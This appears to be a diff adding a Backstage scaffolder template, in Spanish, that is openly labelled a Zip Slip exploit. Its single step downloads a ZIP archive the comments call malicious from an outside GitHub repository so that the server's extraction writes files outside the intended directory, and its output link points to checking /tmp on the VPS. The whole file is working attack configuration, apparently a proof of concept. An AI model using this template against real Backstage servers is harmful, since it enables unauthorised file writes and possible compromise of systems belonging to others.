@@ -1,0 +1,20 @@
+apiVersion: scaffolder.backstage.io/v1beta3
+kind: Template
+metadata:
+  name: zip-slip-exploit
+  title: "Exploit de Descompresión"
+  description: "Esta plantilla disparará el Zip Slip al descargar el archivo"
+spec:
+  owner: guest
+  type: service
+  steps:
+    - id: fetch-malicious-zip
+      name: Descargando y Descomprimiendo el Veneno
+      action: fetch:plain
+      input:
+        # Aquí apuntamos a tu archivo ZIP malicioso
+        url: https://github.com/hugopicanzo/test-zipslip/blob/main/exploit2.zip
+  output:
+    links:
+      - title: "Revisar /tmp en el VPS"
+        url: http://localhost:7007
